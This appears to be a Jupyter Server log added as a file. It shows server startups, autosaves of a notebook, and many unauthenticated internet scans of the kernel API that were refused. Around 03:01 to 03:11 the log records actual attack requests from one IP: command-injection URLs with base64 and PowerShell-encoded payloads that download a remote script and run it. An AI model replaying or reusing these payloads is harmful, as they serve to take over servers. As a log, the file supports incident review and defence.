@@ -1,0 +1,445 @@
+[I 2024-08-01 21:10:06.341 ServerApp] jupyter_lsp | extension was successfully linked.
+[I 2024-08-01 21:10:06.345 ServerApp] jupyter_server_terminals | extension was successfully linked.
+[I 2024-08-01 21:10:06.351 ServerApp] jupyterlab | extension was successfully linked.
+[W 2024-08-01 21:10:06.356 ServerApp] notebook_dir is deprecated, use root_dir
+[I 2024-08-01 21:10:06.356 ServerApp] notebook | extension was successfully linked.
+[I 2024-08-01 21:10:06.570 ServerApp] notebook_shim | extension was successfully linked.
+[W 2024-08-01 21:10:06.584 ServerApp] WARNING: The Jupyter server is listening on all IP addresses and not using encryption. This is not recommended.
+[I 2024-08-01 21:10:06.585 ServerApp] notebook_shim | extension was successfully loaded.
+[I 2024-08-01 21:10:06.587 ServerApp] jupyter_lsp | extension was successfully loaded.
+[I 2024-08-01 21:10:06.588 ServerApp] jupyter_server_terminals | extension was successfully loaded.
+[I 2024-08-01 21:10:06.589 LabApp] JupyterLab extension loaded from /usr/local/lib/python3.10/dist-packages/jupyterlab
+[I 2024-08-01 21:10:06.590 LabApp] JupyterLab application directory is /usr/local/share/jupyter/lab
+[I 2024-08-01 21:10:06.590 LabApp] Extension Manager is 'pypi'.
+[I 2024-08-01 21:10:06.664 ServerApp] jupyterlab | extension was successfully loaded.
+[I 2024-08-01 21:10:06.668 ServerApp] notebook | extension was successfully loaded.
+[I 2024-08-01 21:10:06.668 ServerApp] Serving notebooks from local directory: /home
+[I 2024-08-01 21:10:06.668 ServerApp] Jupyter Server 2.14.1 is running at:
+[I 2024-08-01 21:10:06.668 ServerApp] http://localhost:8888/tree
+[I 2024-08-01 21:10:06.668 ServerApp]     http://127.0.0.1:8888/tree
+[I 2024-08-01 21:10:06.668 ServerApp] Use Control-C to stop this server and shut down all kernels (twice to skip confirmation).
+[W 2024-08-01 21:10:06.676 ServerApp] No web browser found: Error('could not locate runnable browser').
+[I 2024-08-01 21:10:06.695 ServerApp] Skipped non-installed server(s): bash-language-server, dockerfile-language-server-nodejs, javascript-typescript-langserver, jedi-language-server, julia-language-server, pyright, python-language-server, python-lsp-server, r-languageserver, sql-language-server, texlab, typescript-language-server, unified-language-server, vscode-css-languageserver-bin, vscode-html-languageserver-bin, vscode-json-languageserver-bin, yaml-language-server
+[I 2024-08-01 21:10:12.412 ServerApp] 302 GET / (@117.176.248.71) 0.42ms
+[I 2024-08-01 21:10:35.145 ServerApp] jupyter_lsp | extension was successfully linked.
+[I 2024-08-01 21:10:35.149 ServerApp] jupyter_server_terminals | extension was successfully linked.
+[I 2024-08-01 21:10:35.153 ServerApp] jupyterlab | extension was successfully linked.
+[W 2024-08-01 21:10:35.157 ServerApp] notebook_dir is deprecated, use root_dir
+[I 2024-08-01 21:10:35.157 ServerApp] notebook | extension was successfully linked.
+[I 2024-08-01 21:10:35.354 ServerApp] notebook_shim | extension was successfully linked.
+[W 2024-08-01 21:10:35.367 ServerApp] WARNING: The Jupyter server is listening on all IP addresses and not using encryption. This is not recommended.
+[I 2024-08-01 21:10:35.368 ServerApp] notebook_shim | extension was successfully loaded.
+[I 2024-08-01 21:10:35.370 ServerApp] jupyter_lsp | extension was successfully loaded.
+[I 2024-08-01 21:10:35.371 ServerApp] jupyter_server_terminals | extension was successfully loaded.
+[I 2024-08-01 21:10:35.372 LabApp] JupyterLab extension loaded from /usr/local/lib/python3.10/dist-packages/jupyterlab
+[I 2024-08-01 21:10:35.372 LabApp] JupyterLab application directory is /usr/local/share/jupyter/lab
+[I 2024-08-01 21:10:35.372 LabApp] Extension Manager is 'pypi'.
+[I 2024-08-01 21:10:35.439 ServerApp] jupyterlab | extension was successfully loaded.
+[I 2024-08-01 21:10:35.442 ServerApp] notebook | extension was successfully loaded.
+[I 2024-08-01 21:10:35.443 ServerApp] The port 8888 is already in use, trying another port.
+[I 2024-08-01 21:10:35.443 ServerApp] Serving notebooks from local directory: /home
+[I 2024-08-01 21:10:35.443 ServerApp] Jupyter Server 2.14.1 is running at:
+[I 2024-08-01 21:10:35.443 ServerApp] http://localhost:8889/tree
+[I 2024-08-01 21:10:35.443 ServerApp]     http://127.0.0.1:8889/tree
+[I 2024-08-01 21:10:35.443 ServerApp] Use Control-C to stop this server and shut down all kernels (twice to skip confirmation).
+[W 2024-08-01 21:10:35.448 ServerApp] No web browser found: Error('could not locate runnable browser').
+[I 2024-08-01 21:10:35.460 ServerApp] Skipped non-installed server(s): bash-language-server, dockerfile-language-server-nodejs, javascript-typescript-langserver, jedi-language-server, julia-language-server, pyright, python-language-server, python-lsp-server, r-languageserver, sql-language-server, texlab, typescript-language-server, unified-language-server, vscode-css-languageserver-bin, vscode-html-languageserver-bin, vscode-json-languageserver-bin, yaml-language-server
+[I 2024-08-01 21:10:37.869 ServerApp] Interrupted...
+[I 2024-08-01 21:10:42.069 ServerApp] jupyter_lsp | extension was successfully linked.
+[I 2024-08-01 21:10:42.073 ServerApp] jupyter_server_terminals | extension was successfully linked.
+[I 2024-08-01 21:10:42.079 ServerApp] jupyterlab | extension was successfully linked.
+[W 2024-08-01 21:10:42.085 ServerApp] notebook_dir is deprecated, use root_dir
+[I 2024-08-01 21:10:42.085 ServerApp] notebook | extension was successfully linked.
+[I 2024-08-01 21:10:42.285 ServerApp] notebook_shim | extension was successfully linked.
+[W 2024-08-01 21:10:42.298 ServerApp] WARNING: The Jupyter server is listening on all IP addresses and not using encryption. This is not recommended.
+[I 2024-08-01 21:10:42.298 ServerApp] notebook_shim | extension was successfully loaded.
+[I 2024-08-01 21:10:42.300 ServerApp] jupyter_lsp | extension was successfully loaded.
+[I 2024-08-01 21:10:42.301 ServerApp] jupyter_server_terminals | extension was successfully loaded.
+[I 2024-08-01 21:10:42.302 LabApp] JupyterLab extension loaded from /usr/local/lib/python3.10/dist-packages/jupyterlab
+[I 2024-08-01 21:10:42.302 LabApp] JupyterLab application directory is /usr/local/share/jupyter/lab
+[I 2024-08-01 21:10:42.302 LabApp] Extension Manager is 'pypi'.
+[I 2024-08-01 21:10:42.367 ServerApp] jupyterlab | extension was successfully loaded.
+[I 2024-08-01 21:10:42.370 ServerApp] notebook | extension was successfully loaded.
+[I 2024-08-01 21:10:42.371 ServerApp] The port 8888 is already in use, trying another port.
+[I 2024-08-01 21:10:42.371 ServerApp] Serving notebooks from local directory: /home
+[I 2024-08-01 21:10:42.371 ServerApp] Jupyter Server 2.14.1 is running at:
+[I 2024-08-01 21:10:42.371 ServerApp] http://localhost:8889/tree
+[I 2024-08-01 21:10:42.371 ServerApp]     http://127.0.0.1:8889/tree
+[I 2024-08-01 21:10:42.371 ServerApp] Use Control-C to stop this server and shut down all kernels (twice to skip confirmation).
+[W 2024-08-01 21:10:42.375 ServerApp] No web browser found: Error('could not locate runnable browser').
+[I 2024-08-01 21:10:42.387 ServerApp] Skipped non-installed server(s): bash-language-server, dockerfile-language-server-nodejs, javascript-typescript-langserver, jedi-language-server, julia-language-server, pyright, python-language-server, python-lsp-server, r-languageserver, sql-language-server, texlab, typescript-language-server, unified-language-server, vscode-css-languageserver-bin, vscode-html-languageserver-bin, vscode-json-languageserver-bin, yaml-language-server
+[I 2024-08-01 21:11:56.712 ServerApp] jupyter_lsp | extension was successfully linked.
+[I 2024-08-01 21:11:56.716 ServerApp] jupyter_server_terminals | extension was successfully linked.
+[I 2024-08-01 21:11:56.720 ServerApp] jupyterlab | extension was successfully linked.
+[W 2024-08-01 21:11:56.725 ServerApp] notebook_dir is deprecated, use root_dir
+[I 2024-08-01 21:11:56.725 ServerApp] notebook | extension was successfully linked.
+[I 2024-08-01 21:11:56.928 ServerApp] notebook_shim | extension was successfully linked.
+[W 2024-08-01 21:11:56.941 ServerApp] WARNING: The Jupyter server is listening on all IP addresses and not using encryption. This is not recommended.
+[I 2024-08-01 21:11:56.942 ServerApp] notebook_shim | extension was successfully loaded.
+[I 2024-08-01 21:11:56.944 ServerApp] jupyter_lsp | extension was successfully loaded.
+[I 2024-08-01 21:11:56.945 ServerApp] jupyter_server_terminals | extension was successfully loaded.
+[I 2024-08-01 21:11:56.946 LabApp] JupyterLab extension loaded from /usr/local/lib/python3.10/dist-packages/jupyterlab
+[I 2024-08-01 21:11:56.946 LabApp] JupyterLab application directory is /usr/local/share/jupyter/lab
+[I 2024-08-01 21:11:56.946 LabApp] Extension Manager is 'pypi'.
+[I 2024-08-01 21:11:57.012 ServerApp] jupyterlab | extension was successfully loaded.
+[I 2024-08-01 21:11:57.015 ServerApp] notebook | extension was successfully loaded.
+[I 2024-08-01 21:11:57.015 ServerApp] Serving notebooks from local directory: /home
+[I 2024-08-01 21:11:57.015 ServerApp] Jupyter Server 2.14.1 is running at:
+[I 2024-08-01 21:11:57.015 ServerApp] http://localhost:8888/tree
+[I 2024-08-01 21:11:57.016 ServerApp]     http://127.0.0.1:8888/tree
+[I 2024-08-01 21:11:57.016 ServerApp] Use Control-C to stop this server and shut down all kernels (twice to skip confirmation).
+[W 2024-08-01 21:11:57.020 ServerApp] No web browser found: Error('could not locate runnable browser').
+[I 2024-08-01 21:11:57.033 ServerApp] Skipped non-installed server(s): bash-language-server, dockerfile-language-server-nodejs, javascript-typescript-langserver, jedi-language-server, julia-language-server, pyright, python-language-server, python-lsp-server, r-languageserver, sql-language-server, texlab, typescript-language-server, unified-language-server, vscode-css-languageserver-bin, vscode-html-languageserver-bin, vscode-json-languageserver-bin, yaml-language-server
+[I 2024-08-01 21:12:06.830 ServerApp] 302 GET / (@117.176.248.71) 0.44ms
+[I 2024-08-01 21:12:21.439 ServerApp] Kernel started: f4b02ff0-99f3-4fe2-a615-3fc19aa9b142
+[I 2024-08-01 21:12:22.146 ServerApp] Connecting to kernel f4b02ff0-99f3-4fe2-a615-3fc19aa9b142.
+[I 2024-08-01 21:12:22.147 ServerApp] Connecting to kernel f4b02ff0-99f3-4fe2-a615-3fc19aa9b142.
+[I 2024-08-01 21:12:22.149 ServerApp] Connecting to kernel f4b02ff0-99f3-4fe2-a615-3fc19aa9b142.
+[I 2024-08-01 21:12:28.375 ServerApp] Connecting to kernel f4b02ff0-99f3-4fe2-a615-3fc19aa9b142.
+[I 2024-08-01 21:15:29.593 ServerApp] Starting buffering for f4b02ff0-99f3-4fe2-a615-3fc19aa9b142:51294b76-b95f-46a0-b0fc-d3ef7d0b2602
+[I 2024-08-01 21:15:30.398 ServerApp] Connecting to kernel f4b02ff0-99f3-4fe2-a615-3fc19aa9b142.
+[I 2024-08-01 21:15:30.628 ServerApp] Starting buffering for f4b02ff0-99f3-4fe2-a615-3fc19aa9b142:b0dccf00-eed8-4326-9596-b50f4d73a015
+[I 2024-08-01 21:15:31.114 ServerApp] Connecting to kernel f4b02ff0-99f3-4fe2-a615-3fc19aa9b142.
+[I 2024-08-01 21:17:30.915 ServerApp] Saving file at /Rampup2024/1-Basic Alogrithm/0. Random.ipynb
+[I 2024-08-01 21:19:31.146 ServerApp] Saving file at /Rampup2024/1-Basic Alogrithm/0. Random.ipynb
+[I 2024-08-01 21:21:31.429 ServerApp] Saving file at /Rampup2024/1-Basic Alogrithm/0. Random.ipynb
+[I 2024-08-01 21:23:31.658 ServerApp] Saving file at /Rampup2024/1-Basic Alogrithm/0. Random.ipynb
+[I 2024-08-01 21:27:31.889 ServerApp] Saving file at /Rampup2024/1-Basic Alogrithm/0. Random.ipynb
+[I 2024-08-01 21:28:28.243 ServerApp] Saving file at /Rampup2024/1-Basic Alogrithm/0. Random.ipynb
+[I 2024-08-01 21:32:28.469 ServerApp] Saving file at /Rampup2024/1-Basic Alogrithm/0. Random.ipynb
+[I 2024-08-01 21:32:42.023 ServerApp] 302 GET / (@92.249.48.208) 0.46ms
+[I 2024-08-01 21:42:28.736 ServerApp] Saving file at /Rampup2024/1-Basic Alogrithm/0. Random.ipynb
+[I 2024-08-01 21:46:29.075 ServerApp] Saving file at /Rampup2024/1-Basic Alogrithm/0. Random.ipynb
+[I 2024-08-01 21:48:29.298 ServerApp] Saving file at /Rampup2024/1-Basic Alogrithm/0. Random.ipynb
+[I 2024-08-01 21:49:02.994 ServerApp] Saving file at /Rampup2024/1-Basic Alogrithm/0. Random.ipynb
+[I 2024-08-01 21:51:03.261 ServerApp] Saving file at /Rampup2024/1-Basic Alogrithm/0. Random.ipynb
+[I 2024-08-01 21:53:03.527 ServerApp] Saving file at /Rampup2024/1-Basic Alogrithm/0. Random.ipynb
+[I 2024-08-01 21:53:31.057 ServerApp] Saving file at /Rampup2024/1-Basic Alogrithm/0. Random.ipynb
+[I 2024-08-01 21:55:31.313 ServerApp] Saving file at /Rampup2024/1-Basic Alogrithm/0. Random.ipynb
+[I 2024-08-01 21:57:31.536 ServerApp] Saving file at /Rampup2024/1-Basic Alogrithm/0. Random.ipynb
+[I 2024-08-01 21:59:31.764 ServerApp] Saving file at /Rampup2024/1-Basic Alogrithm/0. Random.ipynb
+[I 2024-08-01 22:05:32.029 ServerApp] Saving file at /Rampup2024/1-Basic Alogrithm/0. Random.ipynb
+[I 2024-08-01 22:07:32.305 ServerApp] Saving file at /Rampup2024/1-Basic Alogrithm/0. Random.ipynb
+[I 2024-08-01 22:08:46.764 ServerApp] Saving file at /Rampup2024/1-Basic Alogrithm/0. Random.ipynb
+[IPKernelApp] ERROR | Failed to open SQLite history /root/.ipython/profile_default/history.sqlite (datatype mismatch).
+[IPKernelApp] ERROR | History file was moved to /root/.ipython/profile_default/history-corrupt-2024-08-01T22.09.04.865115.sqlite and a new file created.
+[I 2024-08-01 22:09:52.005 ServerApp] Saving file at /Rampup2024/1-Basic Alogrithm/0. Random.ipynb
+[I 2024-08-01 22:09:59.030 ServerApp] Saving file at /Rampup2024/1-Basic Alogrithm/0. Random.ipynb
+[I 2024-08-01 22:10:15.461 ServerApp] Saving file at /Rampup2024/1-Basic Alogrithm/0. Random.ipynb
+[I 2024-08-01 22:13:41.903 ServerApp] Saving file at /Rampup2024/1-Basic Alogrithm/0. Random.ipynb
+[I 2024-08-01 22:13:46.025 ServerApp] Saving file at /Rampup2024/1-Basic Alogrithm/0. Random.ipynb
+[I 2024-08-01 22:14:52.244 ServerApp] Saving file at /Rampup2024/1-Basic Alogrithm/0. Random.ipynb
+[I 2024-08-01 22:16:17.902 ServerApp] Saving file at /Rampup2024/1-Basic Alogrithm/0. Random.ipynb
+[I 2024-08-01 22:18:18.153 ServerApp] Saving file at /Rampup2024/1-Basic Alogrithm/0. Random.ipynb
+[I 2024-08-01 22:20:18.421 ServerApp] Saving file at /Rampup2024/1-Basic Alogrithm/0. Random.ipynb
+[I 2024-08-01 22:20:19.019 ServerApp] Saving file at /Rampup2024/1-Basic Alogrithm/0. Random.ipynb
+[I 2024-08-01 22:20:53.726 ServerApp] Saving file at /Rampup2024/1-Basic Alogrithm/0. Random.ipynb
+[I 2024-08-01 22:22:54.422 ServerApp] Saving file at /Rampup2024/1-Basic Alogrithm/0. Random.ipynb
+[I 2024-08-01 22:24:54.769 ServerApp] Saving file at /Rampup2024/1-Basic Alogrithm/0. Random.ipynb
+[I 2024-08-01 22:26:55.035 ServerApp] Saving file at /Rampup2024/1-Basic Alogrithm/0. Random.ipynb
+[I 2024-08-01 22:28:55.386 ServerApp] Saving file at /Rampup2024/1-Basic Alogrithm/0. Random.ipynb
+[I 2024-08-01 22:30:55.797 ServerApp] Saving file at /Rampup2024/1-Basic Alogrithm/0. Random.ipynb
+[I 2024-08-01 22:32:56.046 ServerApp] Saving file at /Rampup2024/1-Basic Alogrithm/0. Random.ipynb
+[I 2024-08-01 22:34:56.350 ServerApp] Saving file at /Rampup2024/1-Basic Alogrithm/0. Random.ipynb
+[I 2024-08-01 22:36:56.656 ServerApp] Saving file at /Rampup2024/1-Basic Alogrithm/0. Random.ipynb
+[I 2024-08-01 22:38:56.886 ServerApp] Saving file at /Rampup2024/1-Basic Alogrithm/0. Random.ipynb
+[I 2024-08-01 22:39:10.094 ServerApp] Saving file at /Rampup2024/1-Basic Alogrithm/0. Random.ipynb
+[I 2024-08-01 22:41:10.357 ServerApp] Saving file at /Rampup2024/1-Basic Alogrithm/0. Random.ipynb
+[I 2024-08-01 22:42:17.253 ServerApp] Saving file at /Rampup2024/1-Basic Alogrithm/0. Random.ipynb
+[I 2024-08-01 22:43:24.427 ServerApp] Saving file at /Rampup2024/1-Basic Alogrithm/0. Random.ipynb
+[I 2024-08-01 22:44:23.373 ServerApp] Saving file at /Rampup2024/1-Basic Alogrithm/0. Random.ipynb
+[I 2024-08-01 22:44:36.429 ServerApp] Saving file at /Rampup2024/1-Basic Alogrithm/0. Random.ipynb
+[I 2024-08-01 22:46:36.668 ServerApp] Saving file at /Rampup2024/1-Basic Alogrithm/0. Random.ipynb
+[I 2024-08-01 22:48:36.959 ServerApp] Saving file at /Rampup2024/1-Basic Alogrithm/0. Random.ipynb
+[I 2024-08-01 22:50:37.289 ServerApp] Saving file at /Rampup2024/1-Basic Alogrithm/0. Random.ipynb
+[I 2024-08-01 22:52:37.526 ServerApp] Saving file at /Rampup2024/1-Basic Alogrithm/0. Random.ipynb
+[I 2024-08-01 22:54:37.781 ServerApp] Saving file at /Rampup2024/1-Basic Alogrithm/0. Random.ipynb
+[I 2024-08-01 22:56:38.099 ServerApp] Saving file at /Rampup2024/1-Basic Alogrithm/0. Random.ipynb
+[I 2024-08-01 22:58:31.307 ServerApp] Kernel interrupted: f4b02ff0-99f3-4fe2-a615-3fc19aa9b142
+[I 2024-08-01 22:58:38.325 ServerApp] Saving file at /Rampup2024/1-Basic Alogrithm/0. Random.ipynb
+[I 2024-08-01 23:00:38.561 ServerApp] Saving file at /Rampup2024/1-Basic Alogrithm/0. Random.ipynb
+[I 2024-08-01 23:02:38.883 ServerApp] Saving file at /Rampup2024/1-Basic Alogrithm/0. Random.ipynb
+[I 2024-08-01 23:04:39.126 ServerApp] Saving file at /Rampup2024/1-Basic Alogrithm/0. Random.ipynb
+[I 2024-08-01 23:06:39.413 ServerApp] Saving file at /Rampup2024/1-Basic Alogrithm/0. Random.ipynb
+[I 2024-08-01 23:08:39.654 ServerApp] Saving file at /Rampup2024/1-Basic Alogrithm/0. Random.ipynb
+[I 2024-08-01 23:19:21.356 ServerApp] Starting buffering for f4b02ff0-99f3-4fe2-a615-3fc19aa9b142:48a398d5-cdce-4bec-b4b6-f92087efe992
+[I 2024-08-02 01:23:44.931 ServerApp] 302 GET / (@118.123.105.69) 0.52ms
+[I 2024-08-02 01:23:45.184 ServerApp] 302 GET / (@118.123.105.69) 0.40ms
+[I 2024-08-02 01:23:45.219 JupyterNotebookApp] 302 GET /tree? (@118.123.105.69) 0.61ms
+[W 2024-08-02 02:11:29.399 ServerApp] 405 HEAD / (@123.249.68.177) 0.64ms referer=None
+[I 2024-08-02 02:11:29.450 ServerApp] 302 GET / (@123.249.68.177) 0.41ms
+[I 2024-08-02 02:11:29.464 JupyterNotebookApp] 302 GET /tree (@123.249.68.177) 0.52ms
+[W 2024-08-02 02:18:21.995 ServerApp] 405 HEAD / (@123.249.90.23) 0.42ms referer=None
+[I 2024-08-02 02:18:22.027 ServerApp] 302 GET / (@123.249.90.23) 0.41ms
+[I 2024-08-02 02:18:22.035 JupyterNotebookApp] 302 GET /tree (@123.249.90.23) 0.51ms
+[I 2024-08-02 02:27:04.348 ServerApp] 302 GET / (@92.249.48.208) 0.49ms
+[W 2024-08-02 02:42:40.366 ServerApp] wrote error: 'Method Not Allowed'
+    Traceback (most recent call last):
+      File "/usr/local/lib/python3.10/dist-packages/tornado/web.py", line 1788, in _execute
+        result = method(*self.path_args, **self.path_kwargs)
+      File "/usr/local/lib/python3.10/dist-packages/tornado/web.py", line 269, in _unimplemented_method
+        raise HTTPError(405)
+    tornado.web.HTTPError: HTTP 405: Method Not Allowed
+[W 2024-08-02 02:42:40.385 ServerApp] 405 HEAD /api/kernels?1722519356441 (@123.249.65.172) 19.60ms referer=None
+[W 2024-08-02 02:42:40.472 ServerApp] wrote error: 'Forbidden'
+    Traceback (most recent call last):
+      File "/usr/local/lib/python3.10/dist-packages/tornado/web.py", line 1788, in _execute
+        result = method(*self.path_args, **self.path_kwargs)
+      File "/usr/local/lib/python3.10/dist-packages/tornado/web.py", line 3289, in wrapper
+        url = self.get_login_url()
+      File "/usr/local/lib/python3.10/dist-packages/jupyter_server/base/handlers.py", line 783, in get_login_url
+        raise web.HTTPError(403)
+    tornado.web.HTTPError: HTTP 403: Forbidden
+[W 2024-08-02 02:42:40.474 ServerApp] 403 GET /api/kernels?1722519356441 (@123.249.65.172) 2.61ms referer=None
+[W 2024-08-02 02:43:00.195 ServerApp] wrote error: 'Method Not Allowed'
+    Traceback (most recent call last):
+      File "/usr/local/lib/python3.10/dist-packages/tornado/web.py", line 1788, in _execute
+        result = method(*self.path_args, **self.path_kwargs)
+      File "/usr/local/lib/python3.10/dist-packages/tornado/web.py", line 269, in _unimplemented_method
+        raise HTTPError(405)
+    tornado.web.HTTPError: HTTP 405: Method Not Allowed
+[W 2024-08-02 02:43:00.196 ServerApp] 405 HEAD /api/kernels?1722519356441 (@123.249.65.172) 0.88ms referer=None
+[W 2024-08-02 02:43:00.202 ServerApp] wrote error: 'Forbidden'
+    Traceback (most recent call last):
+      File "/usr/local/lib/python3.10/dist-packages/tornado/web.py", line 1788, in _execute
+        result = method(*self.path_args, **self.path_kwargs)
+      File "/usr/local/lib/python3.10/dist-packages/tornado/web.py", line 3289, in wrapper
+        url = self.get_login_url()
+      File "/usr/local/lib/python3.10/dist-packages/jupyter_server/base/handlers.py", line 783, in get_login_url
+        raise web.HTTPError(403)
+    tornado.web.HTTPError: HTTP 403: Forbidden
+[W 2024-08-02 02:43:00.203 ServerApp] 403 GET /api/kernels?1722519356441 (@123.249.65.172) 0.76ms referer=None
+[W 2024-08-02 02:49:37.160 ServerApp] wrote error: 'Method Not Allowed'
+    Traceback (most recent call last):
+      File "/usr/local/lib/python3.10/dist-packages/tornado/web.py", line 1788, in _execute
+        result = method(*self.path_args, **self.path_kwargs)
+      File "/usr/local/lib/python3.10/dist-packages/tornado/web.py", line 269, in _unimplemented_method
+        raise HTTPError(405)
+    tornado.web.HTTPError: HTTP 405: Method Not Allowed
+[W 2024-08-02 02:49:37.160 ServerApp] 405 HEAD /api/kernelspecs?1722517886075 (@124.71.235.245) 1.17ms referer=None
+[W 2024-08-02 02:49:37.245 ServerApp] wrote error: 'Forbidden'
+    Traceback (most recent call last):
+      File "/usr/local/lib/python3.10/dist-packages/tornado/web.py", line 1788, in _execute
+        result = method(*self.path_args, **self.path_kwargs)
+      File "/usr/local/lib/python3.10/dist-packages/tornado/web.py", line 3289, in wrapper
+        url = self.get_login_url()
+      File "/usr/local/lib/python3.10/dist-packages/jupyter_server/base/handlers.py", line 783, in get_login_url
+        raise web.HTTPError(403)
+    tornado.web.HTTPError: HTTP 403: Forbidden
+[W 2024-08-02 02:49:37.246 ServerApp] 403 GET /api/kernelspecs?1722517886075 (@124.71.235.245) 1.19ms referer=None
+[W 2024-08-02 02:53:36.989 ServerApp] wrote error: 'Method Not Allowed'
+    Traceback (most recent call last):
+      File "/usr/local/lib/python3.10/dist-packages/tornado/web.py", line 1788, in _execute
+        result = method(*self.path_args, **self.path_kwargs)
+      File "/usr/local/lib/python3.10/dist-packages/tornado/web.py", line 269, in _unimplemented_method
+        raise HTTPError(405)
+    tornado.web.HTTPError: HTTP 405: Method Not Allowed
+[W 2024-08-02 02:53:36.989 ServerApp] 405 HEAD /api/kernels?1722518088663 (@123.249.82.229) 0.96ms referer=None
+[W 2024-08-02 02:53:37.035 ServerApp] wrote error: 'Forbidden'
+    Traceback (most recent call last):
+      File "/usr/local/lib/python3.10/dist-packages/tornado/web.py", line 1788, in _execute
+        result = method(*self.path_args, **self.path_kwargs)
+      File "/usr/local/lib/python3.10/dist-packages/tornado/web.py", line 3289, in wrapper
+        url = self.get_login_url()
+      File "/usr/local/lib/python3.10/dist-packages/jupyter_server/base/handlers.py", line 783, in get_login_url
+        raise web.HTTPError(403)
+    tornado.web.HTTPError: HTTP 403: Forbidden
+[W 2024-08-02 02:53:37.035 ServerApp] 403 GET /api/kernels?1722518088663 (@123.249.82.229) 0.91ms referer=None
+[W 2024-08-02 03:01:11.444 ServerApp] 404 GET /api/ping/;%60echo%20KGN1cmwgLWsgaHR0cHM6Ly9kaXNjaXBsaW5lLXBhZC1kcml2ZXItY2hlYXBlci50cnljbG91ZGZsYXJlLmNvbS9vZGluIHx8IHdnZXQgLS1uby1jaGVjay1jZXJ0aWZpY2F0ZSAtTy0gaHR0cHM6Ly9kaXNjaXBsaW5lLXBhZC1kcml2ZXItY2hlYXBlci50cnljbG91ZGZsYXJlLmNvbS9vZGluKSB8IGJhc2ggLXNo%20%7C%20base64%20-d%20%7C%20sh%60 (@107.172.34.27) 8.81ms referer=None
+[W 2024-08-02 03:05:57.060 ServerApp] 404 GET /AdminPage/conf/runCmd?cmd=echo%20KGN1cmwgLWsgaHR0cHM6Ly9kaXNjaXBsaW5lLXBhZC1kcml2ZXItY2hlYXBlci50cnljbG91ZGZsYXJlLmNvbS9vZGluIHx8IHdnZXQgLS1uby1jaGVjay1jZXJ0aWZpY2F0ZSAtTy0gaHR0cHM6Ly9kaXNjaXBsaW5lLXBhZC1kcml2ZXItY2hlYXBlci50cnljbG91ZGZsYXJlLmNvbS9vZGluKSB8IGJhc2ggLXNo%20%7C%20base64%20-d%20%7C%20sh (@107.172.34.27) 1.38ms referer=None
+[I 2024-08-02 03:11:17.842 ServerApp] 302 GET /?n=%0A&cmd=powershell%20-Exec%20ByPass%20-Nol%20-Enc%20dAByAHkAIAB7ACAASQBFAFgAKAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcABzADoALwAvAGQAaQBzAGMAaQBwAGwAaQBuAGUALQBwAGEAZAAtAGQAcgBpAHYAZQByAC0AYwBoAGUAYQBwAGUAcgAuAHQAcgB5AGMAbABvAHUAZABmAGwAYQByAGUALgBjAG8AbQAvAHcAaQBuAC8AbABvAGsAaQAuAHAAcwAxACcAKQApACAAfQAgAGMAYQB0AGMAaAAgAHsAIABJAG4AdgBvAGsAZQAtAFcAZQBiAFIAZQBxAHUAZQBzAHQAIAAtAFUAcgBpACAAJwBoAHQAdABwAHMAOgAvAC8AZABpAHMAYwBpAHAAbABpAG4AZQAtAHAAYQBkAC0AZAByAGkAdgBlAHIALQBjAGgAZQBhAHAAZQByAC4AdAByAHkAYwBsAG8AdQBkAGYAbABhAHIAZQAuAGMAbwBtAC8AdwBpAG4ALwBsAG8AawBpAC4AcABzADEAJwAgAC0AVQBzAGUAQgBhAHMAaQBjAFAAYQByAHMAaQBuAGcAIAB8ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAfQA%3D&search=%25xxx%25url%25:%password%}{.exec|{.?cmd.}|timeout=15|out=abc.}{.?n.}{.?n.}RESULT:{.?n.}{.^abc.}===={.?n.} (@107.172.34.27) 0.49ms
+[I 2024-08-02 03:14:50.585 ServerApp] 302 GET / (@57.151.70.168) 0.38ms
+[W 2024-08-02 03:29:37.613 ServerApp] 403 POST /tplus/ajaxpro/Ufida.T.CodeBehind._PriorityLevel,App_Code.ashx?method=GetStoreWarehouseByStore (107.172.34.27): '_xsrf' argument missing from POST
+[W 2024-08-02 03:29:37.614 ServerApp] 403 POST /tplus/ajaxpro/Ufida.T.CodeBehind._PriorityLevel,App_Code.ashx?method=GetStoreWarehouseByStore (@107.172.34.27) 1.66ms referer=None
+[W 2024-08-02 03:42:13.754 ServerApp] wrote error: 'Method Not Allowed'
+    Traceback (most recent call last):
+      File "/usr/local/lib/python3.10/dist-packages/tornado/web.py", line 1788, in _execute
+        result = method(*self.path_args, **self.path_kwargs)
+      File "/usr/local/lib/python3.10/dist-packages/tornado/web.py", line 269, in _unimplemented_method
+        raise HTTPError(405)
+    tornado.web.HTTPError: HTTP 405: Method Not Allowed
+[W 2024-08-02 03:42:13.755 ServerApp] 405 HEAD /api/kernels?1722522793980 (@123.249.90.104) 0.91ms referer=None
+[W 2024-08-02 03:42:13.823 ServerApp] wrote error: 'Forbidden'
+    Traceback (most recent call last):
+      File "/usr/local/lib/python3.10/dist-packages/tornado/web.py", line 1788, in _execute
+        result = method(*self.path_args, **self.path_kwargs)
+      File "/usr/local/lib/python3.10/dist-packages/tornado/web.py", line 3289, in wrapper
+        url = self.get_login_url()
+      File "/usr/local/lib/python3.10/dist-packages/jupyter_server/base/handlers.py", line 783, in get_login_url
+        raise web.HTTPError(403)
+    tornado.web.HTTPError: HTTP 403: Forbidden
+[W 2024-08-02 03:42:13.824 ServerApp] 403 GET /api/kernels?1722522793980 (@123.249.90.104) 1.03ms referer=None
+[W 2024-08-02 03:42:53.078 ServerApp] wrote error: 'Method Not Allowed'
+    Traceback (most recent call last):
+      File "/usr/local/lib/python3.10/dist-packages/tornado/web.py", line 1788, in _execute
+        result = method(*self.path_args, **self.path_kwargs)
+      File "/usr/local/lib/python3.10/dist-packages/tornado/web.py", line 269, in _unimplemented_method
+        raise HTTPError(405)
+    tornado.web.HTTPError: HTTP 405: Method Not Allowed
+[W 2024-08-02 03:42:53.079 ServerApp] 405 HEAD /api/kernelspecs?1722522119064 (@123.249.116.81) 1.18ms referer=None
+[W 2024-08-02 03:42:53.217 ServerApp] wrote error: 'Forbidden'
+    Traceback (most recent call last):
+      File "/usr/local/lib/python3.10/dist-packages/tornado/web.py", line 1788, in _execute
+        result = method(*self.path_args, **self.path_kwargs)
+      File "/usr/local/lib/python3.10/dist-packages/tornado/web.py", line 3289, in wrapper
